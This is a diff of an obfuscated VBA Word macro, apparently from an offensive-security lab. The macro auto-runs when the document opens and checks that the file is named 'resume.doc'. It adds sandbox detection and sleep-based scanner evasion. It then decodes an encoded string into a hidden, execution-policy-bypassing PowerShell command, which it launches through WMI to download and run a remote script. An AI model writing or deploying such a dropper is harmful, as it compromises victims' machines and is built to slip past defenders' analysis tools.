@@ -1,32 +1,69 @@
-Function Pears(Beets)
-    Pears = Chr(Beets - 17)
+Private Declare PtrSafe Function Sleep Lib "kernel32" (ByVal mili As Long) As Long
+Private Declare PtrSafe Function FlsAlloc Lib "kernel32" (ByVal lpCallback As LongPtr) As Long
+
+Sub Document_Open()
+  ShellcodeRunner
+End Sub
+
+Sub AutoOpen()
+  ShellcodeRunner
+End Sub
+
+Function TQQQ(VGT)
+    TQQQ = Chr(VGT - 17)
 End Function
 
-Function Strawberries(Grapes)
-    Strawberries = Left(Grapes, 3)
+Function QQQ(SQQQ)
+    QQQ = Left(SQQQ, 3)
 End Function
 
-Function Almonds(Jelly)
-    Almonds = Right(Jelly, Len(Jelly) - 3)
+Function Vanguard(MSFT)
+    Vanguard = Right(MSFT, Len(MSFT) - 3)
 End Function
 
-Function Nuts(Milk)
+Function BTC(APPL)
     Do
-    Oatmilk = Oatmilk + Pears(Strawberries(Milk))
-    Milk = Almonds(Milk)
-    Loop While Len(Milk) > 0
-    Nuts = Oatmilk
+    TSLA = TSLA + TQQQ(QQQ(APPL))
+    APPL = Vanguard(APPL)
+    Loop While Len(APPL) > 0
+    BTC = TSLA
 End Function
 
-Function MyMacro()
-    Dim Apples As String
-    Dim Water As String
+
+Function ShellcodeRunner()
+  Dim buf As Variant
+  Dim tmp As LongPtr
+  Dim addr As LongPtr
+  Dim counter As Long
+  Dim data As Long
+  Dim res As Long
+  Dim dream As Integer
+  Dim before As Date
+  
+  ' resume.doc
+  
+  If ActiveDocument.Name <> BTC("131118132134126118063117128116") Then
+    Exit Function
+  End If
+  
+  ' Check if we're in a sandbox by calling a rare-emulated API
+  If IsNull(FlsAlloc(tmp)) Then
+    Exit Function
+  End If
+
+  ' Sleep to evade in-memory scan + check if the emulator did not fast-forward through the sleep instruction
+  dream = Int((1500 * Rnd) + 2000)
+  before = Now()
+  Sleep (dream)
+  If DateDiff("s", t, Now()) < dream Then
+    Exit Function
+  End If
+
+  Dim VOO As String
+  Dim VTX As String
     
-    Apples = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062136049121122117117118127049062116049122118137057057127118136062128115123118116133049132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063066066074063066067065064115128128124063133137133056058058"
-    Water = Nuts(Apples)
-    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
+  VOO = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062136049121122117117118127049062116049122118137057057127118136062128115123118116133049132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063069074063071069064115138129114132132063129132066056058058"
+  VTX = BTC(VOO)
+  GetObject(BTC("136122127126120126133132075")).Get(BTC("104122127068067112097131128116118132132")).Create VTX, ETH, SQ, QQQM
 End Function
 
-If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
-  Exit Function
-End If
